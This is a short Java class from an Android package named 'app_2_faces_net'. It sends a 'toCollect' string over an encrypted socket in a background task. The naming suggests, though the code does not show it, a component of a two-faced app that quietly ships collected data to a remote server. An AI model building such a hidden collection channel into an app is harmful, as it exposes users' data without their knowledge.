package com.android.app_2_faces_net;

import java.util.concurrent.Callable;

public class CollectorTask implements Runnable {

    private final CryptedSocket collectorSocket;
    private final String toCollect;

    public CollectorTask(CryptedSocket collectorSocket, String toCollect) {
        this.collectorSocket = collectorSocket;
        this.toCollect = toCollect;
    }

    @Override
    public void run() {
        try {
            this.collectorSocket.connect();
            this.collectorSocket.write(this.toCollect);
            this.collectorSocket.close();
        } catch (Exception e) {
            this.collectorSocket.close();
        }
        this.collectorSocket.close();
    }
}
